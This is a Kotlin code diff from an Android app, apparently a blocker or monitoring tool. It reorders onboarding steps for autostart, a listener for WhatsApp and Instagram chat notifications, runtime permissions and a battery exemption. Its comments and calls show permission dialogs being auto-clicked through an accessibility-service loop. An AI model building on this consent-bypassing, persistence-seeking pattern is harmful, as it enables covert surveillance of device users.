@@ -459,28 +459,7 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // Step 2: OEM Autostart (Xiaomi MIUI/HyperOS, Vivo, Oppo, Realme to survive Recent Apps Clear All immediately)
-        if (isOemRom() && !autostartPrompted) {
-            autostartPrompted = true
-            val autostartIntent = getAutostartIntent() ?: Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                data = Uri.parse("package:$packageName")
-            }
-            try {
-                autostartLauncher.launch(autostartIntent)
-                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Failed to launch autostart settings", e)
-            }
-        }
-
-        // Step 3: Notification Access (WhatsApp & Instagram chat listener)
-        if (!isNotificationAccessGranted() && !notificationPrompted && !skipNotificationStep) {
-            showNotificationDialog()
-            return
-        }
-
-        // Step 4: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
+        // Step 2: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
         val missingRuntime = getMissingRuntimePermissions()
         if (missingRuntime.isNotEmpty()) {
             BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
@@ -491,7 +470,13 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // Step 5: Battery Optimization Exemption (Prompts direct system dialog "Let app always run in background?")
+        // Step 3: Notification Access (WhatsApp & Instagram chat listener)
+        if (!isNotificationAccessGranted() && !notificationPrompted && !skipNotificationStep) {
+            showNotificationDialog()
+            return
+        }
+
+        // Step 4: Battery Optimization Exemption (Prompts direct system dialog "Let app always run in background?")
         if (!isBatteryExempted() && !batteryPrompted) {
             batteryPrompted = true
             try {
@@ -503,6 +488,21 @@ class MainActivity : AppCompatActivity() {
                 return
             } catch (e: Exception) {
                 Log.w(TAG, "Failed to launch battery exemption intent", e)
+            }
+        }
+
+        // Step 5: OEM Autostart (Xiaomi MIUI/HyperOS, Vivo, Oppo, Realme to survive Recent Apps Clear All)
+        if (isOemRom() && !autostartPrompted) {
+            autostartPrompted = true
+            val autostartIntent = getAutostartIntent() ?: Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                data = Uri.parse("package:$packageName")
+            }
+            try {
+                autostartLauncher.launch(autostartIntent)
+                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                return
+            } catch (e: Exception) {
+                Log.w(TAG, "Failed to launch autostart settings", e)
             }
         }
 
